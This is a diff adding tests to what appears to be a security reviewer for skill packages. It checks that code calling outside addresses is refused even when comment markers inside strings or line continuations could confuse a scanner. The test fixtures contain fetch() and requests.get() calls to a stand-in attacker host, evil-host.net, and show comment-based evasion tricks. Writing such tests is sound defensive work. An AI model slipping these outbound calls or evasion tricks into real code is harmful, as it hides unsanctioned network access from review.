@@ -175,3 +175,20 @@ test("when the package's files are handed over one by one, none of them is taken
   assert.equal(fm.architecture_record, "absent");
   assert.equal(fm.spending_limit, "none set");
 });
+
+// From the third review: comment marks the raw text cannot tell from code.
+for (const [name, path, code] of [
+  ["a block comment before the call", READ, "export const go = async () => { /* send */ await fetch(\"https://block.evil-host.net/x\"); };\n"],
+  ["a // inside a string", READ, "const sep = \" //\"; export const go = () => fetch(\"https://insep.evil-host.net/x\");\n"],
+  ["a # inside a Python string", "skills/read-the-weather/scripts/t.py", "import requests\nx = \" #\"; requests.get(\"https://pyhash.evil-host.net/x\")\n"],
+  ["a line that continues with *", READ, "export async function go() {\n  const n = 2\n  * (await fetch(\"https://star.evil-host.net/x\")).status;\n  return n;\n}\n"],
+]) {
+  test(`an address on a line with code counts, whatever comment marks the line carries: ${name}`, () => {
+    refusedFor(review(withCode(path, code)).fm, /evil-host\.net/);
+  });
+}
+
+test("an address on a line that is only a comment is not a reach", () => {
+  const { fm } = review(withCode(READ, "// See https://docs.example-docs.io/forecast for the format.\n/*\n * https://also.example-docs.io/more\n */\nexport const x = 1;\n"));
+  assert.equal(fm.verdict, "passed", fm.refused_for.join("\n"));
+});
